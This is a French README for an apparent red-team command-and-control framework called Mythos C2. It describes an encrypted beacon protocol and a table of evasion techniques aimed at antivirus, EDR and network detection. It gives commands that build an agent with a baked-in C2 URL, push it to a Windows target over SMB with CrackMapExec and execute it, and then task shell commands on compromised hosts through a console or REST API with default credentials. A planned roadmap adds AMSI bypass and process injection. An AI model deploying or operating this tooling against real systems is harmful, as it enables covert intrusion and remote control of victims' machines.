# Mythos C2 Framework

<p align="center">
  <img src="./mythos_c2_logo.png" alt="Mythos C2 Logo" width="300" />
</p>

> Framework de Command & Control pour opérations Red Team  
> Développé par SHERKO — Data Analyst / Ingénieur Cybersécurité / Orienté Red Team / Chercheur en sécurité

---

## Architecture globale

```
┌─────────────────────────────────────────────────────────────┐
│                    Opérateurs Red Team                       │
│              (Console CLI / API REST :8443)                  │
└─────────────────────────┬───────────────────────────────────┘
                          │ HTTPS + JWT
┌─────────────────────────▼───────────────────────────────────┐
│                   Team Server (Go)                           │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐   │
│  │ Listener │  │   API    │  │   DB     │  │  Crypto  │   │
│  │  HTTPS   │  │  REST    │  │  SQLite  │  │ ECDH+AES │   │
│  └────┬─────┘  └──────────┘  └──────────┘  └──────────┘   │
└───────┼─────────────────────────────────────────────────────┘
        │ HTTPS chiffré AES-256-GCM
        │ Toutes les 60s ± jitter
┌───────▼─────────────────────────────────────────────────────┐
│                    Agent (Rust)                              │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐   │
│  │Transport │  │  Crypto  │  │Commands  │  │ Evasion  │   │
│  │ Beacon   │  │ECDH+GCM  │  │ Shell/PS │  │Anti-sand │   │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘   │
└─────────────────────────────────────────────────────────────┘
```

---

## Protocole de communication

### 1. Handshake initial (ECDH)

```
Agent                                    Serveur
  │                                         │
  │── POST /api/v1/telemetry ──────────────►│
  │   { pk: base64(agent_pub_key),          │
  │     h: hostname, u: username, ... }     │
  │                                         │
  │   Serveur génère sa paire ECDH          │
  │   Dérive : shared_secret = ECDH(        │
  │     server_priv × agent_pub)            │
  │   session_key = HKDF(shared_secret)     │
  │                                         │
  │◄── { id: uuid, pk: server_pub_key } ───│
  │                                         │
  Agent dérive aussi :                      │
  session_key = HKDF(ECDH(                 │
    agent_priv × server_pub))              │
  Les deux ont le même session_key !        │
```

### 2. Beacon loop

```
Agent                                    Serveur
  │                                         │
  │── POST /api/v1/metrics ────────────────►│
  │   { id: agent_uuid,                     │
  │     d: base64(AES-GCM(beacon_data)) }  │
  │                                         │
  │◄── { d: base64(AES-GCM(tasks)) } ──────│
  │                                         │
  │   Exécuter les tâches...                │
  │                                         │
  │── POST /api/v1/analytics ──────────────►│
  │   { id: uuid,                           │
  │     d: base64(AES-GCM(result)) }       │
  │◄── 200 OK ──────────────────────────────│
```

---

## Techniques d'évasion implémentées

| Technique | Cible | Description |
|---|---|---|
| Anti-sandbox timing | Émulateurs AV | 5M ops CPU chronométrées |
| Anti-debug | x64dbg, OllyDbg | IsDebuggerPresent / timing |
| Jitter beacon | Détection par timing réseau | ±20% sur l'intervalle |
| User-Agent légitime | Proxy / NGFW | Chrome 120 réel |
| URIs banales | Détection par pattern URL | /api/v1/telemetry |
| AES-256-GCM | Inspection TLS | Corps HTTP chiffré |
| Sleep obfuscation | Scanner RAM EDR | Chiffrement mémoire pendant sleep |
| Binaire strippé | Analyse statique | Pas de symboles de debug |

---

## Installation & Démarrage

### Prérequis

```bash
# Go 1.22+
go version

# Rust + cargo
rustup --version

# Pour la cross-compilation Windows depuis Linux
rustup target add x86_64-pc-windows-gnu
apt install gcc-mingw-w64-x86-64 -y
```

### Compiler

```bash
# Cloner le repo
git clone https://github.com/redteamtogo/mythos-c2
cd mythos-c2

# Compiler avec l'URL du C2
C2_URL=https://192.168.249.100:8080 bash scripts/build.sh windows
```

### Démarrer le team server

```bash
./dist/mythos-server \
  --listener-port 8080 \
  --api-port 8443 \
  --admin-pass "VotreMotDePasseSecurisé!"

# Vérifier que ça tourne
curl http://localhost:8443/api/ping
# → {"status":"mythos"}
```

### Déployer l'agent

```bash
# Sur la cible Windows (depuis Kali via CrackMapExec)
crackmapexec smb <TARGET_IP> -u user -p pass \
  --put-file ./dist/mythos-agent.exe C:\\Windows\\Temp\\svc.exe

crackmapexec smb <TARGET_IP> -u user -p pass \
  -x "C:\\Windows\\Temp\\svc.exe"
```

### 4. Utiliser la Console Opérateur (Nouveau !)

La manière la plus simple d'interagir avec le C2 est d'utiliser la console interactive intégrée.

```bash
# Ouvrir un NOUVEAU terminal, et lancer la console :
cd mythos-c2/server
go run cmd/console/main.go --api http://127.0.0.1:8443

# Identifiants par défaut :
# Username : admin
# Password : MythosAdmin2024!
```

#### Commandes de base dans la console :
```text
mythos > agents             # Liste les agents connectés
mythos > use <AGENT_ID>     # Sélectionne un agent
mythos [ID] > shell whoami  # Envoie une commande asynchrone
mythos [ID] > tasks         # Récupère le résultat
```

#### 🚀 Mode "Pseudo-Interactif"
Pour une fluidité totale, vous pouvez basculer l'agent en mode interactif. Cela réduit le sleep à 1s et permet de naviguer naturellement.

```text
mythos [ID] > interactive
[*] Passage en mode interactif (sleep = 1s)...

mythos-shell [ID] > whoami
corp\alice

mythos-shell [ID] > cd Desktop
Directory changed to C:\Users\alice\Desktop

mythos-shell [ID] > exit
[*] Sortie du mode interactif (rétablissement sleep = 60s)...
```

---

### 5. API Avancée (Pour l'automatisation)

Vous pouvez toujours interagir avec le C2 via des requêtes HTTP brutes (curl, python, etc.).

```bash
# S'authentifier
TOKEN=$(curl -s -X POST http://localhost:8443/api/operators/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"MythosAdmin2024!"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Envoyer une tâche
curl -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"type":"shell","payload":"whoami /all"}' \
  http://localhost:8443/api/agents/<AGENT_ID>/task
```

---

## Roadmap — Prochaines fonctionnalités

- [ ] Direct syscalls (Hell's Gate) — bypass hooks ntdll
- [ ] Process injection (svchost.exe)
- [ ] DLL hijacking module
- [ ] ETW patching
- [ ] AMSI bypass
- [ ] DNS tunneling listener
- [ ] CDN redirectors (Cloudflare)
- [ ] Console web (React)
- [ ] Collaboration multi-opérateurs (WebSocket)
- [ ] Export rapport automatique

---

## Avertissement légal

Ce framework est développé à des fins de **recherche en sécurité offensive**
et d'**éducation**. Son utilisation est réservée à des environnements
contrôlés (labs, engagements Red Team autorisés).

Toute utilisation sur des systèmes sans autorisation explicite est illégale.

---

## Contribuer

SHERKO — Pull requests bienvenues.

Domaines où contribuer en priorité :
- Module DLL hijacking (Rust/C)
- Listener DNS tunneling (Go)
- Interface web opérateur (React)
- Techniques de sleep obfuscation Windows
